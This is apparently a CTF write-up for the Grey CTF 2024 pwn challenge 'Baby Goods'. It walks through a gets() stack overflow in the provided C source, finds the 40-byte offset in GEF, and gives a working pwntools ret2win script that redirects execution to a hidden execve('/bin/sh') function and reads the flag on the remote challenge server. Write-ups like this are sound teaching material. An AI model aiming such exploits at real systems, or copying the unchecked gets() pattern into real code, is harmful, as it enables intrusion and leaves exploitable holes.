---
title: Grey CTF Quals 24 "Baby Goods"
date: 2024-04-24
description: Writeup for pwn/baby-goods from Grey CTF Quals 2024.
categories:
  - pwn
---

> I have opened a new shop for baby goods! Feel free to explore around :)
> 
> Author: uhg

TL;DR - Buffer overflow allowing an overwrite of the return address to a vulnerable function. Simple ret2win challenge.

<!-- more -->

## Investigating

We're given two different files, a binary to test locally on and a source. In the C source code we can see the following areas of interest:

```c title="babygoods.c" hl_lines="20-23"
...
int sub_15210123() {
	execve("/bin/sh", 0, 0);
}

int buildpram() {
	char buf[0x10];
	char size[4];
	int num;

	printf("\nChoose the size of the pram (1-5): ");
	fgets(size,4,stdin);
	size[strcspn(size, "\r\n")] = '\0';
	num = atoi(size);
	if (1 > num || 5 < num) {
		printf("\nInvalid size!\n");
		return 0;
	}

	printf("\nYour pram has been created! Give it a name: ");
	//buffer overflow! user can pop shell directly from here
	gets(buf);
	printf("\nNew pram %s of size %s has been created!\n", buf, size);
	return 0;
}
...
```

So obviously, as hinted by the comment, we need to do an overflow on the `#!c gets(buf)`.

???+ bug "`#!c gets()` Overflows"
	In C the `#!c gets()` function is a dangerous function that can lead to buffer overflows. It reads a line from `#!c stdin` and stores it in the buffer `#!c buf` until a newline character is found. The vulnerability is that it doesn't check the size of the buffer, so if the input is larger than the buffer, it will overflow into the stack.

However, even with this static code analysis, there are a few optimizations done during the compile process (such as padding and stack alignment) that can make it difficult to determine the exact size of the buffer. We don't need to go heavy with the analysis so we won't use Ghidra or IDA, but we can use a cyclic pattern to determine the exact size of the buffer. We need to find the offset to the return address to be able to overwrite it. We'll use GDB to do this:

```hl_lines="4-6"
$ gdb -q babygoods
Reading symbols from babygoods...
(No debugging symbols found in babygoods)
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  run
...
Your pram has been created! Give it a name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
...

[#0] Id 1, Name: "babygoods", stopped 0x401328 in buildpram (), reason: SIGSEGV
```

Here, the program experiences a segmentation fault because it tries to access an unreachable address after the return address on the stack is overwritten. To determine the necessary offset to control the return address, which follows the stack pointer in the frame layout, we can use a GEF command to search for our input in RSP:

```
gef➤  pattern search $rsp
[+] Searching for '6661616161616161'/'6161616161616166' with period=8
[+] Found at offset 40 (little-endian search) likely
```

This shows that an offset of 40 bytes is required to reach the return address. Next, we need to find the address of the function we want to return to, in our case `#!c sub_15210123()`, we can do that in GDB as well:

```
gef➤  info fun sub_15210123
All functions matching regular expression "sub_15210123":

Non-debugging symbols:
0x0000000000401236  sub_15210123
```

## Exploiting

So we now know the address of `#!c sub_15210123()` is `#!c 0x401236`. Because of the architecture, we'll need to write it in little-endian format, but we can simply use the pwnlib library to do this for us, as shown below:

```python title="exploit.py"
from pwn import *

p = process('./babygoods')

p.sendlineafter('name: ', 'fbad') # First prompt (input doesn't matter)
p.sendlineafter('today?\n', '1')  # Menu prompt (input doesn't matter)
p.sendlineafter('(1-5): ', '1')   # Pram size prompt (input doesn't matter)

payload  = b'A' * 40     # fill stack until return address
payload += p64(0x401236) # address of sub_15210123()

p.sendlineafter('name: ', payload) # Send payload (1)
p.interactive() # Allows us to interact with the program
```

1. Payload sent will be `#!py b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12@\x00\x00\x00\x00\x00'`.

Testing it locally it works as expected, and we get a shell. We can replace `#!py p = process('./babygoods')` with `#!py p = remote('challs.nusgreyhats.org', 32345)` to connect to the remote server and get the flag.

```shell hl_lines="10"
$ python exploit.py
[+] Opening connection to challs.nusgreyhats.org on port 32345: Done
[*] Switching to interactive mode

New pram AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12 of size 1 has been created!
$ ls
flag.txt
run
$ cat flag.txt
grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}
```

Just like that, we get the flag.